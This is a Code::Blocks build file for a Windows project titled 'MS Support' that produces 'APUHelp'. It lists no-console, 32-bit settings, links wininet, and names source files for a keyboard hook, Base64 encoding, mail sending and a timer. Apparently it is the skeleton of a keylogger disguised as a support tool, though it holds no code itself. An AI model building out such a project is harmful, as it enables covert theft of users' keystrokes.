<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<CodeBlocks_project_file>
	<FileVersion major="1" minor="6" />
	<Project>
		<Option title="MS Support" />
		<Option pch_mode="2" />
		<Option compiler="gcc" />
		<Build>
			<Target title="Debug">
				<Option output="bin/Debug/APUHelp" prefix_auto="1" extension_auto="1" />
				<Option object_output="obj/Debug/" />
				<Option type="1" />
				<Option compiler="gcc" />
				<Compiler>
					<Add option="-std=c++11" />
					<Add option="-mwindows" />
					<Add option="-g" />
				</Compiler>
				<Linker>
					<Add option="-mwindows" />
				</Linker>
			</Target>
			<Target title="Release">
				<Option output="bin/Release/APUHelp" prefix_auto="1" extension_auto="1" />
				<Option object_output="obj/Release/" />
				<Option type="1" />
				<Option compiler="gcc" />
				<Compiler>
					<Add option="-O2" />
					<Add option="-std=c++11" />
					<Add option="-mwindows" />
				</Compiler>
				<Linker>
					<Add option="-s" />
					<Add option="-mwindows" />
				</Linker>
			</Target>
		</Build>
		<Compiler>
			<Add option="-Wall" />
			<Add option="-std=c++11" />
			<Add option="-mwindows" />
			<Add option="-m32" />
			<Add option="-fexceptions" />
		</Compiler>
		<Linker>
			<Add option="-mwindows" />
			<Add option="-m32" />
			<Add library="wininet" />
		</Linker>
		<Unit filename="Base64.h" />
		<Unit filename="Helper.h" />
		<Unit filename="IO.h" />
		<Unit filename="KeyConstansts.h" />
		<Unit filename="KeybHook.h" />
		<Unit filename="SendMail.h" />
		<Unit filename="Timer.h" />
		<Unit filename="main.cpp" />
		<Extensions>
			<code_completion />
			<envvars />
			<debugger />
		</Extensions>
	</Project>
</CodeBlocks_project_file>
